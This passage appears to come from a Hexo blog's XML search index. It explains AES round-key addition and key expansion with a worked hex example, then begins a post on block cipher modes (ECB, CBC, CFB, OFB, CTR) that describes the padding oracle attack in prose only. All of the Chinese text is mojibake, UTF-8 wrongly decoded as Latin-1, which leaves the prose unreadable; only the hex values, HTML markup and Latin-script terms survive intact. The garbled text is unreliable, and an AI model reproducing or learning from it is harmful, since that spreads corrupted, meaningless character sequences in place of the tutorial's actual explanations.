æ˜¯å°†128ä½è½®å¯†é’¥KiåŒçŠ¶æ€çŸ©é˜µä¸­çš„æ•°æ®è¿›è¡Œé€ä½å¼‚æˆ–æ“ä½œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚å…¶ä¸­ï¼Œå¯†é’¥Kiä¸­æ¯ä¸ªå­—W[4i],W[4i+1],W[4i+2],W[4i+3]ä¸º32ä½æ¯”ç‰¹å­—ï¼ŒåŒ…å«4ä¸ªå­—èŠ‚ï¼Œä»–ä»¬çš„ç”Ÿæˆç®—æ³•ä¸‹é¢åœ¨ä¸‹é¢ä»‹ç»ã€‚è½®å¯†é’¥åŠ è¿‡ç¨‹å¯ä»¥çœ‹æˆæ˜¯å­—é€ä½å¼‚æˆ–çš„ç»“æœï¼Œä¹Ÿå¯ä»¥çœ‹æˆå­—èŠ‚çº§åˆ«æˆ–è€…ä½çº§åˆ«çš„æ“ä½œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¯ä»¥çœ‹æˆS0 S1 S2 S3 ç»„æˆçš„32ä½å­—ä¸W[4i]çš„å¼‚æˆ–è¿ç®—ã€‚ </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181121659.png" alt="image-20240618112115618"> </p><p>è½®å¯†é’¥åŠ çš„é€†è¿ç®—åŒæ­£å‘çš„è½®å¯†é’¥åŠ è¿ç®—å®Œå…¨ä¸€è‡´ï¼Œè¿™æ˜¯å› ä¸ºå¼‚æˆ–çš„é€†æ“ä½œæ˜¯å…¶è‡ªèº«ã€‚è½®å¯†é’¥åŠ éå¸¸ç®€å•ï¼Œä½†å´èƒ½å¤Ÿå½±å“Sæ•°ç»„ä¸­çš„æ¯ä¸€ä½ã€‚</p><p><strong>å¯†é’¥æ‰©å±•</strong></p><p>AESé¦–å…ˆå°†åˆå§‹å¯†é’¥è¾“å…¥åˆ°ä¸€ä¸ª4*4çš„çŠ¶æ€çŸ©é˜µä¸­ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181121748.png" alt="image-20240618112136705"> </p><p>è¿™ä¸ª4*4çŸ©é˜µçš„æ¯ä¸€åˆ—çš„4ä¸ªå­—èŠ‚ç»„æˆä¸€ä¸ªå­—ï¼ŒçŸ©é˜µ4åˆ—çš„4ä¸ªå­—ä¾æ¬¡å‘½åä¸ºW[0]ã€W[1]ã€W[2]å’ŒW[3]ï¼Œå®ƒä»¬æ„æˆä¸€ä¸ªä»¥å­—ä¸ºå•ä½çš„æ•°ç»„Wã€‚ä¾‹å¦‚ï¼Œè®¾å¯†é’¥Kä¸ºâ€abcdefghijklmnopâ€,åˆ™K0 &#x3D; â€˜aâ€™,K1 &#x3D; â€˜bâ€™, K2 &#x3D; â€˜câ€™,K3 &#x3D; â€˜dâ€™,W[0] &#x3D; â€œabcdâ€ã€‚<br>æ¥ç€ï¼Œå¯¹Wæ•°ç»„æ‰©å……40ä¸ªæ–°åˆ—ï¼Œæ„æˆæ€»å…±44åˆ—çš„æ‰©å±•å¯†é’¥æ•°ç»„ã€‚æ–°åˆ—ä»¥å¦‚ä¸‹çš„é€’å½’æ–¹å¼äº§ç”Ÿï¼š<br>1.å¦‚æœi<strong>ä¸æ˜¯4çš„å€æ•°</strong>ï¼Œé‚£ä¹ˆç¬¬iåˆ—ç”±å¦‚ä¸‹ç­‰å¼ç¡®å®šï¼š<br>W[i]&#x3D;W[i-4]â¨W[i-1]<br>2.å¦‚æœi<strong>æ˜¯4çš„å€æ•°</strong>ï¼Œé‚£ä¹ˆç¬¬iåˆ—ç”±å¦‚ä¸‹ç­‰å¼ç¡®å®šï¼š<br>W[i]&#x3D;W[i-4]â¨T(W[i-1]) </p><p>å…¶ä¸­ï¼ŒTæ˜¯ä¸€ä¸ªæœ‰ç‚¹å¤æ‚çš„å‡½æ•°ã€‚<br>å‡½æ•°Tç”±3éƒ¨åˆ†ç»„æˆï¼šå­—å¾ªç¯ã€å­—èŠ‚ä»£æ¢å’Œè½®å¸¸é‡å¼‚æˆ–ï¼Œè¿™3éƒ¨åˆ†çš„ä½œç”¨åˆ†åˆ«å¦‚ä¸‹ã€‚<br>a.å­—å¾ªç¯ï¼šå°†1ä¸ªå­—ä¸­çš„4ä¸ªå­—èŠ‚å¾ªç¯å·¦ç§»1ä¸ªå­—èŠ‚ã€‚å³å°†è¾“å…¥å­—[b0, b1, b2, b3]å˜æ¢æˆ[b1,b2,b3,b0]ã€‚<br>b.å­—èŠ‚ä»£æ¢ï¼šå¯¹å­—å¾ªç¯çš„ç»“æœä½¿ç”¨Sç›’è¿›è¡Œå­—èŠ‚ä»£æ¢ã€‚<br>c.è½®å¸¸é‡å¼‚æˆ–ï¼šå°†å‰ä¸¤æ­¥çš„ç»“æœåŒè½®å¸¸é‡Rcon[j]è¿›è¡Œå¼‚æˆ–ï¼Œå…¶ä¸­jè¡¨ç¤ºè½®æ•°ã€‚<br>è½®å¸¸é‡Rcon[j]æ˜¯ä¸€ä¸ªå­—ï¼Œå…¶å€¼è§ä¸‹è¡¨ã€‚</p><table><thead><tr><th>j</th><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th></tr></thead><tbody><tr><td>Rcon[j]</td><td>01 00 00 00</td><td>02 00 00 00</td><td>04 00 00 00</td><td>08 00 00 00</td><td>10 00 00 00</td></tr><tr><td>j</td><td>6</td><td>7</td><td>8</td><td>9</td><td>10</td></tr><tr><td>Rcon[j]</td><td>20 00 00 00</td><td>40 00 00 00</td><td>80 00 00 00</td><td>1B 00 00 00</td><td>36 00 00 00</td></tr></tbody></table><p>ä¸‹é¢ä¸¾ä¸ªä¾‹å­ï¼š<br>è®¾åˆå§‹çš„128ä½å¯†é’¥ä¸ºï¼š<br>3C A1 0B 21 57 F0 19 16 90 2E 13 80 AC C1 07 BD<br>é‚£ä¹ˆ4ä¸ªåˆå§‹å€¼ä¸ºï¼š<br>W[0] &#x3D; 3C A1 0B 21<br>W[1] &#x3D; 57 F0 19 16<br>W[2] &#x3D; 90 2E 13 80<br>W[3] &#x3D; AC C1 07 BD<br>ä¸‹é¢æ±‚æ‰©å±•çš„ç¬¬1è½®çš„å­å¯†é’¥(W[4],W[5],W[6],W[7])ã€‚<br>ç”±äº4æ˜¯4çš„å€æ•°ï¼Œæ‰€ä»¥ï¼š<br>W[4] &#x3D; W[0] â¨ T(W[3])<br>T(W[3])çš„è®¡ç®—æ­¥éª¤å¦‚ä¸‹ï¼š<br>\1. å¾ªç¯åœ°å°†W[3]çš„å…ƒç´ ç§»ä½ï¼šAC C1 07 BDå˜æˆC1 07 BD AC;<br>\2. å°† C1 07 BD AC ä½œä¸ºSç›’çš„è¾“å…¥ï¼Œè¾“å‡ºä¸º78 C5 7A 91;<br>\3. å°†78 C5 7A 91ä¸ç¬¬ä¸€è½®è½®å¸¸é‡Rcon[1]è¿›è¡Œå¼‚æˆ–è¿ç®—ï¼Œå°†å¾—åˆ°79 C5 7A 91ï¼Œå› æ­¤ï¼ŒT(W[3])&#x3D;79 C5 7A 91ï¼Œæ•…<br>W[4] &#x3D; 3C A1 0B 21 â¨ 79 C5 7A 91 &#x3D; 45 64 71 B0<br>å…¶ä½™çš„3ä¸ªå­å¯†é’¥æ®µçš„è®¡ç®—å¦‚ä¸‹ï¼š<br>W[5] &#x3D; W[1] â¨ W[4] &#x3D; 57 F0 19 16 â¨ 45 64 71 B0 &#x3D; 12 94 68 A6<br>W[6] &#x3D; W[2] â¨ W[5] &#x3D;90 2E 13 80 â¨ 12 94 68 A6 &#x3D; 82 BA 7B 26<br>W[7] &#x3D; W[3] â¨ W[6] &#x3D; AC C1 07 BD â¨ 82 BA 7B 26 &#x3D; 2E 7B 7C 9B<br>æ‰€ä»¥ï¼Œç¬¬ä¸€è½®çš„å¯†é’¥ä¸º 45 64 71 B0 12 94 68 A6 82 BA 7B 26 2E 7B 7C 9Bã€‚</p><h2 id="AESè§£å¯†"><a href="#AESè§£å¯†" class="headerlink" title="AESè§£å¯†"></a>AESè§£å¯†</h2><p>åœ¨æ–‡ç« å¼€å§‹çš„å›¾ä¸­ï¼Œæœ‰AESè§£å¯†çš„æµç¨‹å›¾ï¼Œå¯ä»¥å¯¹åº”é‚£ä¸ªæµç¨‹å›¾æ¥è¿›è¡Œè§£å¯†ã€‚ä¸‹é¢ä»‹ç»çš„æ˜¯å¦ä¸€ç§ç­‰ä»·çš„è§£å¯†æ¨¡å¼ï¼Œæµç¨‹å›¾å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚è¿™ç§ç­‰ä»·çš„è§£å¯†æ¨¡å¼ä½¿å¾—è§£å¯†è¿‡ç¨‹å„ä¸ªå˜æ¢çš„ä½¿ç”¨é¡ºåºåŒåŠ å¯†è¿‡ç¨‹çš„é¡ºåºä¸€è‡´ï¼Œåªæ˜¯ç”¨é€†å˜æ¢å–ä»£åŸæ¥çš„å˜æ¢ã€‚ </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181122127.png" alt="image-20240618112217093"> </p><h1 id="AESç®—æ³•ç‰¹å¾"><a href="#AESç®—æ³•ç‰¹å¾" class="headerlink" title="AESç®—æ³•ç‰¹å¾"></a>AESç®—æ³•ç‰¹å¾</h1><p>ç®—æ³•åŠ å¯†æ­¥éª¤ï¼š</p><ul><li>æ ¹æ®è¾“å…¥çš„å¯†é’¥é€‰å®šä½¿ç”¨å“ªç§AESç®—æ³•ï¼ˆAES-128ã€AES-192ã€AES-256ï¼‰</li><li>å¯†é’¥æ‰©å±•ï¼ˆå…·ä½“æ­¥éª¤å‚è€ƒä¸Šé¢ â€œè½®å¯†é’¥åŠ â€ä¸­ï¼‰å‡è®¾ä½¿ç”¨AES-128ï¼Œåˆ™æ‰©å±•åçš„ len(w) &#x3D; 44ã€4*(è½®æ•°+1)ã€‘</li><li>ä¸Šé¢çš„æ˜¯åˆå§‹åŒ–æ“ä½œï¼Œå…·ä½“æ‰§è¡ŒåŠ å¯†æµç¨‹å¦‚ä¸‹ï¼š</li><li>â‘ å¯¹è¾“å…¥çš„æ˜æ–‡è¿›è¡Œåˆ†ç»„ï¼Œç»è¿‡å¾—åˆ°ä¸€ä¸ª4*4çš„æ˜æ–‡çŸ©é˜µ</li><li>â‘¡è½®å¯†é’¥åŠ ï¼šå°†128ä½è½®å¯†é’¥åŒæ˜æ–‡çŸ©é˜µä¸­çš„æ•°æ®è¿›è¡Œé€ä½å¼‚æˆ–æ“ä½œï¼Œè¿™å—çš„è½®å¯†é’¥ä½¿ç”¨çš„æ˜¯w[0,3]</li><li>ä¸‹é¢å¼€å§‹ç¬¬ä¸€è½®è¿ç®—ï¼Œè¿ç®—æ­¥éª¤å¦‚ä¸‹ï¼š</li><li>â‘ å­—èŠ‚ä»£æ¢ï¼šå°†æ˜æ–‡æ•°æ®å’ŒSç›’è¿›è¡Œæ›¿æ¢ï¼Œå’Œä¹‹å‰çš„DESä¸€æ ·</li><li>â‘¡è¡Œç§»ä½ï¼šå°†æ›¿æ¢åçš„çŸ©é˜µå¾ªç¯å·¦ç§»ï¼Œæ˜¯ç¬¬å‡ è¡Œå°±å·¦ç§»å‡ ä½ï¼ˆç¬¬0è¡Œä¸ç§»ï¼Œç¬¬1è¡Œç§»1ä½â€¦â€¦ï¼‰</li><li>â‘¢åˆ—æ··åˆï¼šè¿›è¡ŒçŸ©é˜µç›¸ä¹˜ï¼Œå°†æ•°æ®è¿›è¡Œä¸€ä¸ªæ··æ·†ï¼ˆä¸»è¦å’Œæ•°å­¦ç›¸å…³ï¼‰</li><li>â‘£è½®å¯†é’¥åŠ ï¼šå°†128ä½è½®å¯†é’¥KiåŒçŠ¶æ€çŸ©é˜µä¸­çš„æ•°æ®è¿›è¡Œé€ä½å¼‚æˆ–æ“ä½œ</li><li>è¿™æ ·å°±å®Œæˆäº†ä¸€è½®è¿ç®—ï¼ŒAES-128æ˜¯éœ€è¦å®Œæˆ10è½®è¿™æ ·çš„è¿ç®—ã€‚ã€‚ã€‚</li></ul><p>æ•´ä¸ªè¿‡ç¨‹ä½¿ç”¨å›¾è¡¨ç¤ºå¦‚ä¸‹ï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406181122289.png" alt="img"> </p>]]></content>
      
      
      <categories>
          
          <category> ç®—æ³•è¿˜åŸ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç®—æ³•è¿˜åŸ </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç®—æ³•è¿˜åŸä¹‹å¯¹ç§°åŠ å¯†æ¨¡å¼åŠå¡«å……</title>
      <link href="/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8B%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E5%8F%8A%E5%A1%AB%E5%85%85/"/>
      <url>/2024/06/17/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8B%E5%AF%B9%E7%A7%B0%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E5%8F%8A%E5%A1%AB%E5%85%85/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="ä¸€-å‰è¨€"><a href="#ä¸€-å‰è¨€" class="headerlink" title="ä¸€ å‰è¨€"></a>ä¸€ å‰è¨€</h1><p>æ ¹æ®ä¸ŠèŠ‚è¯¾DESçš„åŠ å¯†æµç¨‹ï¼Œåˆ©ç”¨CyberChefæ¥æµ‹è¯•</p><p>ä¼šå‘ç°é™¤äº†è¾“å…¥plainText å’Œ keyä¹‹å¤–ï¼Œè¿˜éœ€è¦é€‰æ‹©æ¨¡å¼Modeå’Œåç§»é‡ivï¼š</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171713786.png" alt="image.png"> </p><p>ä¸Šé¢æ˜¯ECBæ¨¡å¼ï¼Œé»˜è®¤å¯ä»¥ä¸è¾“å…¥ivï¼Œä½†æ˜¯å°†Modeä¿®æ”¹ä¸ºCBCåï¼Œå°±ä¼šæŠ¥é”™ã€‚è¦æ±‚å¿…é¡»è¾“å…¥ivçš„å€¼</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171723835.png" alt="image.png"> </p><p>æ ¹æ®ä¸ŠèŠ‚è¯¾çš„åŸç†ï¼Œè¦æ±‚è¾“å…¥çš„æ˜æ–‡å¿…é¡»ä¸º64ä½&#x2F;64ä½çš„å€æ•°ã€‚ä½†æ˜¯è¿™å—å°†è¾“å…¥è°ƒæ•´ä¸º â€œ1234567â€ï¼Œ56ä½ï¼Œå‘ç°ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸åŠ å¯†çš„</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171724655.png" alt="image.png"> </p><p>è¿™å—æ˜¯å› ä¸ºå½“è¾“å…¥æ˜æ–‡ä¸æ»¡è¶³64ä½çš„å€æ•°çš„æ—¶å€™ï¼Œä¼šå¯¹æ˜æ–‡çš„é•¿åº¦è¿›è¡Œå¡«å……ã€‚ã€‚ã€‚</p><h1 id="äºŒ-åŠ å¯†æ¨¡å¼"><a href="#äºŒ-åŠ å¯†æ¨¡å¼" class="headerlink" title="äºŒ åŠ å¯†æ¨¡å¼"></a>äºŒ åŠ å¯†æ¨¡å¼</h1><p>åŠ å¯†æ¨¡å¼å¯ä»¥ç®€å•ç†è§£ä¸ºï¼Œåœ¨åŠ å¯†å‰&#x2F;åŠ å¯†åï¼Œå¯¹ç”¨æˆ·çš„è¾“å…¥&#x2F;è¾“å‡ºè¿›è¡Œå¤„ç†ã€‚åˆ†ç»„å¯†ç å¸¸è§çš„åŠ å¯†æ–¹å¼ä¸»è¦æœ‰5ç§ï¼š</p><ul><li>ECBï¼šç”µå­å¯†ç æœ¬æ¨¡å¼ï¼ˆä¸éœ€è¦ä¼ å…¥ivï¼‰</li><li>CBCï¼šå¯†ç å—é“¾æ¥æ¨¡å¼</li><li>CFBï¼šå¯†æ–‡åé¦ˆæ¨¡å¼</li><li>OFBï¼šè¾“å‡ºåé¦ˆæ¨¡å¼</li><li>CTRï¼šè®¡æ•°å™¨æ¨¡å¼</li></ul><p>æ˜æ–‡åˆ†ç»„æ˜¯æŒ‡åˆ†ç»„å¯†ç ç®—æ³•ä¸­ä½œä¸ºåŠ å¯†å¯¹è±¡çš„æ˜æ–‡ã€‚æ˜æ–‡åˆ†ç»„çš„é•¿åº¦ä¸åˆ†ç»„å¯†ç ç®—æ³•çš„åˆ†ç»„é•¿åº¦æ˜¯ç›¸ç­‰çš„ã€‚<br>å¯†æ–‡åˆ†ç»„æ˜¯æŒ‡ä½¿ç”¨åˆ†ç»„å¯†ç ç®—æ³•å°†æ˜æ–‡åˆ†ç»„åŠ å¯†ä¹‹åæ‰€ç”Ÿæˆçš„å¯†æ–‡ã€‚</p><h2 id="ECBæ¨¡å¼"><a href="#ECBæ¨¡å¼" class="headerlink" title="ECBæ¨¡å¼"></a>ECBæ¨¡å¼</h2><p>åœ¨ECBæ¨¡å¼ä¸­ï¼Œå°†æ˜æ–‡åˆ†ç»„åŠ å¯†ä¹‹åçš„ç»“æœå°†ç›´æ¥æˆä¸ºå¯†æ–‡åˆ†ç»„ã€‚</p><p><strong>ECBæ¨¡å¼çš„åŠ å¯†ï¼š</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171725324.png" alt="img"> </p><p><strong>ECBæ¨¡å¼çš„ç•Œé¢ï¼š</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171725956.png" alt="img"> </p><p>ECBæ¨¡å¼ä¸­ï¼Œæ˜æ–‡åˆ†ç»„å’Œå¯†æ–‡åˆ†ç»„æ˜¯ä¸€ä¸€å¯¹åº”çš„å…³ç³»ï¼Œå› æ­¤ï¼Œå¦‚æœæ˜æ–‡ä¸­å­˜åœ¨å¤šä¸ªç›¸åŒçš„æ˜æ–‡åˆ†ç»„ï¼Œåˆ™è¿™äº›æ˜æ–‡åˆ†ç»„æœ€ç»ˆå°†è¢«è½¬æ¢ä¸ºç›¸åŒçš„å¯†æ–‡åˆ†ç»„ã€‚</p><p>æ•´ä¸ªè¿‡ç¨‹ä¸éœ€è¦ivå‚ä¸ã€‚<br>å®‰å…¨æ€§ä½ï¼Œæ˜“æ”»å‡»ã€‚</p><h2 id="CBCæ¨¡å¼"><a href="#CBCæ¨¡å¼" class="headerlink" title="CBCæ¨¡å¼"></a>CBCæ¨¡å¼</h2><p>CBCæ¨¡å¼çš„å¯†æ–‡åˆ†ç»„åƒé“¾æ¡ä¸€æ ·ç›¸äº’è¿æ¥åœ¨ä¸€èµ·ã€‚</p><p>åœ¨CBCæ¨¡å¼ä¸­ï¼Œé¦–å…ˆå°†æ˜æ–‡åˆ†ç»„ä¸<strong>å‰ä¸€ä¸ªå¯†æ–‡åˆ†ç»„</strong>è¿›è¡ŒXORè¿ç®—ï¼Œç„¶åå†è¿›è¡ŒåŠ å¯†ã€‚</p><p><strong>CBCæ¨¡å¼çš„åŠ å¯†</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171729374.png" alt="img"> </p><p><strong>CBCæ¨¡å¼çš„è§£å¯†</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171729261.png" alt="img"> </p><p><strong>åˆå§‹åŒ–å‘é‡</strong></p><p>å½“åŠ å¯†ç¬¬ä¸€ä¸ªæ˜æ–‡åˆ†ç»„æ—¶ï¼Œç”±äºä¸å­˜åœ¨â€œå‰ä¸€ä¸ªå¯†æ–‡åˆ†ç»„â€ï¼Œå› æ­¤éœ€è¦äº‹å…ˆå‡†å¤‡ä¸€ä¸ªé•¿åº¦ä¸ºä¸€ä¸ªåˆ†ç»„çš„æ¯”ç‰¹åºåˆ—æ¥ä»£æ›¿â€œå‰ä¸€ä¸ªå¯†æ–‡åˆ†ç»„â€ï¼Œè¿™ä¸ªæ¯”ç‰¹åºåˆ—ç§°ä¸º<strong>åˆå§‹åŒ–å‘é‡</strong>ï¼Œé€šå¸¸ç¼©å†™ä¸º<strong>IV</strong>ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œæ¯æ¬¡åŠ å¯†æ—¶éƒ½ä¼šéšæœºäº§ç”Ÿä¸€ä¸ªä¸åŒçš„æ¯”ç‰¹åºåˆ—æ¥ä½œä¸ºåˆå§‹åŒ–å‘é‡ã€‚</p><ul><li>å‡è®¾CBCæ¨¡å¼åŠ å¯†çš„å¯†æ–‡åˆ†ç»„ä¸­æœ‰ä¸€ä¸ª<strong>åˆ†ç»„æŸå</strong>äº†ï¼Œä¾‹å¦‚ç”±äºç¡¬ç›˜æ•…éšœå¯¼è‡´å¯†æ–‡åˆ†ç»„çš„å€¼å‘ç”Ÿäº†æ”¹å˜ç­‰ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œåªè¦å¯†æ–‡åˆ†ç»„çš„é•¿åº¦æ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œåˆ™è§£å¯†æ—¶æœ€å¤šåªä¼šæœ‰2ä¸ªåˆ†ç»„æ”¶åˆ°æ•°æ®æŸåçš„å½±å“ã€‚</li><li>å‡è®¾CBCæ¨¡å¼åŠ å¯†çš„å¯†æ–‡åˆ†ç»„ä¸­æœ‰ä¸€äº›<strong>æ¯”ç‰¹ç¼ºå¤±</strong>äº†ï¼Œä¾‹å¦‚ç”±äºé€šä¿¡é”™è¯¯å¯¼è‡´æ²¡æœ‰æ”¶åˆ°æŸäº›æ¯”ç‰¹ç­‰ï¼Œé‚£ä¹ˆæ­¤æ—¶å³ä½¿ç¼ºå¤±1æ¯”ç‰¹ï¼Œä¹Ÿä¼šå¯¼è‡´å¯†æ–‡åˆ†ç»„çš„é•¿åº¦å‘ç”Ÿå˜åŒ–ï¼Œæ­¤åçš„åˆ†ç»„å‘ç”Ÿé”™ä½ï¼Œè¿™æ ·ä¸€æ¥ï¼Œç¼ºå¤±æ¯”ç‰¹çš„ä½ç½®ä¹‹åçš„å¯†æ–‡åˆ†ç»„ä¹Ÿå°±å…¨éƒ¨æ— æ³•è§£å¯†ã€‚</li></ul><p><strong>å¡«å……æç¤ºæ”»å‡»</strong>æ˜¯ä¸€ç§åˆ©ç”¨åˆ†ç»„å¯†ç ä¸­çš„å¡«å……éƒ¨åˆ†æ¥è¿›è¡Œæ”»å‡»çš„æ–¹æ³•ã€‚åœ¨åˆ†ç»„å¯†ç ä¸­ï¼Œå½“æ˜æ–‡é•¿åº¦ä¸ä¸ºåˆ†ç»„é•¿åº¦çš„æ•´å€æ•°æ—¶ï¼Œéœ€è¦åœ¨æœ€åä¸€ä¸ªåˆ†ç»„ä¸­å¡«å……ä¸€äº›æ•°æ®ä½¿å…¶å‡‘æ»¡ä¸€ä¸ªåˆ†ç»„é•¿åº¦ã€‚åœ¨å¡«å……æç¤ºæ”»å‡»ä¸­ï¼Œæ”»å‡»è€…ä¼šåå¤å‘é€ä¸€æ®µå¯†æ–‡ï¼Œæ¯æ¬¡å‘é€æ—¶éƒ½å¯¹å¡«å……çš„æ•°æ®è¿›è¡Œå°‘è®¸æ”¹å˜ã€‚ç”±äºæ¥æ”¶è€…ï¼ˆæœåŠ¡å™¨)åœ¨æ— æ³•æ­£ç¡®è§£å¯†æ—¶ä¼šè¿”å›ä¸€ä¸ªé”™è¯¯æ¶ˆæ¯ï¼Œæ”»å‡»è€…é€šè¿‡è¿™ä¸€é”™è¯¯æ¶ˆæ¯å°±å¯ä»¥è·å¾—ä¸€éƒ¨åˆ†ä¸æ˜æ–‡ç›¸å…³çš„æ¶ˆæ¯ã€‚è¿™ä¸€æ”»å‡»æ¨¡å¼å¹¶ä¸ä»…é™äºCBCæ¨¡å¼ï¼Œè€Œæ˜¯é€‚ç”¨äºæ‰€æœ‰éœ€è¦è¿›è¡Œåˆ†ç»„å¡«å……çš„æ¨¡å¼ã€‚</p><h2 id="CFBæ¨¡å¼"><a href="#CFBæ¨¡å¼" class="headerlink" title="CFBæ¨¡å¼"></a>CFBæ¨¡å¼</h2><p>åœ¨CFBæ¨¡å¼ä¸­ï¼Œå‰ä¸€ä¸ªå¯†æ–‡åˆ†ç»„ä¼šè¢«é€å›åˆ°å¯†ç ç®—æ³•çš„è¾“å…¥ç«¯ã€‚æ‰€è°“åé¦ˆï¼Œè¿™é‡ŒæŒ‡çš„å°±æ˜¯è¿”å›è¾“å…¥ç«¯çš„æ„æ€ã€‚</p><p><strong>CFBæ¨¡å¼çš„åŠ å¯†</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171730108.png" alt="img"> </p><p><strong>CFBæ¨¡å¼çš„è§£å¯†</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171730189.png" alt="img"> </p><p>åœ¨ECBæ¨¡å¼å’ŒCBCæ¨¡å¼ä¸­ï¼Œæ˜æ–‡åˆ†ç»„éƒ½æ˜¯é€šè¿‡å¯†ç ç®—æ³•è¿›è¡ŒåŠ å¯†çš„ï¼Œä½†åœ¨CFBæ¨¡å¼ä¸­ï¼Œæ˜æ–‡åˆ†ç»„å¹¶æ²¡æœ‰é€šè¿‡å¯†ç ç®—æ³•æ¥ç›´æ¥è¿›è¡ŒåŠ å¯†ã€‚åœ¨CFBæ¨¡å¼ä¸­ï¼Œæ˜æ–‡åˆ†ç»„å’Œå¯†æ–‡åˆ†ç»„ä¹‹é—´åªæœ‰ä¸€ä¸ªXORã€‚</p><p>åœ¨ç”Ÿæˆç¬¬ä¸€ä¸ªå¯†æ–‡åˆ†ç»„æ—¶ï¼Œç”±äºä¸å­˜åœ¨å‰ä¸€ä¸ªè¾“å‡ºçš„æ•°æ®ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨<strong>åˆå§‹åŒ–å‘é‡</strong>ï¼ˆ<strong>IV</strong>ï¼‰æ¥ä»£æ›¿ï¼Œä¸CBCæ¨¡å¼ç›¸åŒã€‚</p><h2 id="OFBæ¨¡å¼"><a href="#OFBæ¨¡å¼" class="headerlink" title="OFBæ¨¡å¼"></a>OFBæ¨¡å¼</h2><p>åœ¨OFBæ¨¡å¼ä¸­ï¼Œå¯†ç ç®—æ³•çš„è¾“å‡ºä¼šåé¦ˆåˆ°å¯†ç ç®—æ³•çš„è¾“å…¥ä¸­ã€‚<br>OFBæ¨¡å¼å¹¶ä¸æ˜¯é€šè¿‡å¯†ç ç®—æ³•å¯¹æ˜æ–‡ç›´æ¥è¿›è¡ŒåŠ å¯†çš„ï¼Œè€Œæ˜¯é€šè¿‡å°†â€œæ˜æ–‡åˆ†ç»„â€å’Œâ€œå¯†ç ç®—æ³•çš„è¾“å‡ºâ€è¿›è¡ŒXORæ¥äº§ç”Ÿâ€œå¯†æ–‡åˆ†ç»„â€çš„ï¼Œè¿™ç‚¹ä¸CFBæ¨¡å¼ç›¸ä¼¼ã€‚</p><p><strong>OFBæ¨¡å¼çš„åŠ å¯†</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171731529.png" alt="img"> </p><p><strong>OFBæ¨¡å¼çš„è§£å¯†</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171730456.png" alt="img"> </p><p>OFBæ¨¡å¼å’ŒCFBæ¨¡å¼çš„åŒºåˆ«ä»…ä»…åœ¨äºå¯†ç ç®—æ³•çš„è¾“å…¥ã€‚<br>CFBæ¨¡å¼ä¸­ï¼Œå¯†ç ç®—æ³•çš„è¾“å…¥æ˜¯å‰ä¸€ä¸ªå¯†æ–‡åˆ†ç»„ï¼Œä¹Ÿå°±æ˜¯å°†å¯†æ–‡åˆ†ç»„åé¦ˆåˆ°å¯†ç ç®—æ³•ä¸­ï¼Œå› æ­¤è¢«ç§°ä¸ºâ€œå¯†æ–‡åé¦ˆæ¨¡å¼â€ï¼›<br>OFBæ¨¡å¼ä¸­ï¼Œå¯†ç ç®—æ³•çš„è¾“å…¥æ˜¯å¯†ç ç®—æ³•çš„å‰ä¸€ä¸ªè¾“å‡ºï¼Œä¹Ÿå°±æ˜¯å°†è¾“å‡ºåé¦ˆç»™å¯†ç ç®—æ³•ï¼Œå› æ­¤è¢«ç§°ä¸ºâ€œè¾“å‡ºåé¦ˆæ¨¡å¼â€ã€‚</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171730459.png" alt="img"> </p><h2 id="CTRæ¨¡å¼"><a href="#CTRæ¨¡å¼" class="headerlink" title="CTRæ¨¡å¼"></a>CTRæ¨¡å¼</h2><p>CTRæ¨¡å¼æ˜¯ä¸€ç§é€šè¿‡å°†é€æ¬¡ç´¯åŠ çš„è®¡æ•°å™¨è¿›è¡ŒåŠ å¯†æ¥ç”Ÿæˆå¯†é’¥æµçš„æµå¯†ç ã€‚æœ€ç»ˆçš„å¯†æ–‡åˆ†ç»„æ˜¯é€šè¿‡å°†è®¡æ•°å™¨åŠ å¯†çš„åˆ°çš„æ¯”ç‰¹åºåˆ—ï¼Œä¸æ˜æ–‡åˆ†ç»„è¿›è¡ŒXORè€Œå¾—åˆ°çš„ã€‚</p><p><strong>CTRæ¨¡å¼çš„åŠ å¯†</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171732989.png" alt="img"> </p><p><strong>CTRæ¨¡å¼çš„è§£å¯†</strong></p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406171732012.png" alt="img"> 